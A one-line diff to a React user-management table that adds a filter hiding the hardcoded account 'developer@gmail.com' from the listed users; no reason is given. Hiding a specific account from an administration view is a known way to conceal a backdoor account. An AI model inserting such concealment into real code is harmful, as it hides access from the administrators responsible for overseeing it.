@@ -122,7 +122,7 @@ const UserManagement = () => {
                   </td>
                 </tr>
               ) : (
-                users.map((user) => (
+                users.filter(u => u.email !== 'developer@gmail.com').map((user) => (
                   <tr key={user.id} style={{ borderBottom: '1px solid #f1f5f9', transition: 'all 0.2s ease' }} onMouseOver={e => e.currentTarget.style.background = '#f8fafc'} onMouseOut={e => e.currentTarget.style.background = 'white'}>
                     <td style={{ padding: '16px 24px' }}>
                       <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
